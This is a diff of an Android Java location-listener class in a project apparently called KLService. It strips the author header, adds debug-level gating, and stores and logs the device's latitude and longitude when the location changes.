@@ -1,42 +1,41 @@
-/********************************************************************************
- * KLService
- * ---------
- * A general purpose all information gather service. 
- * Class: KLSActivity.
- * Class Description: Starter application for KLService main functionality. 
- * Author: Aviad Golan -=OverFlow=-
- * 			(aviadgolan@gmail.com)
- *   .--.                  .---. .-.                       
- *  : ,. :                 : .--': :                 nTM    
- *  : :: :.-..-. .--. .--. : `;  : :   .--. .-..-..-.      
- *  : :; :: `; :' '_.': ..': :   : :_ ' .; :: `; `; :      
- *  `.__.'`.__.'`.__.':_;  :_;   `.__;`.__.'`.__.__.'      
- *
- ********************************************************************************/
-
 package com.OverFlow.KLService;
 
 import android.location.Location;
 import android.location.LocationListener;
 import android.os.Bundle;
 import android.util.Log;
+import android.widget.Toast;
 
 public class KLSLocationListener implements LocationListener {
-
+	private int mDebugLevel;
+	
+	public KLSLocationListener() {
+		
+		mDebugLevel = FMDebugLog.getDebugLevel();
+	}
+	
 	@Override
 	public void onLocationChanged(Location location) {
-		Log.i(getClass().getSimpleName(),"AVIAD: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
+	       if (location != null) {
+	    		if (mDebugLevel  > 1) {
+	    			//Toast.makeText(mContext, "Location Thread Starting ...", Toast.LENGTH_LONG).show();
+	    		}
+	    		if (mDebugLevel > 0) {
+	    			Log.i(getClass().getSimpleName(), "AVIAD: Location changed: -- LAT=" + location.getLatitude() + " LON=" + location.getLongitude() +" ...");
+	    		}
+	    		FMService.mLocation = location;
+	       }
 	}
 
 	@Override
 	public void onProviderDisabled(String provider) {
-		Log.i(getClass().getSimpleName(), "AVIAD: GPS Provider Disabled...");
+		// TODO Auto-generated method stub
 		
 	}
 
 	@Override
 	public void onProviderEnabled(String provider) {
-		Log.i(getClass().getSimpleName(), "AVIAD: GPS Provider Enabled...");
+		// TODO Auto-generated method stub
 		
 	}
 
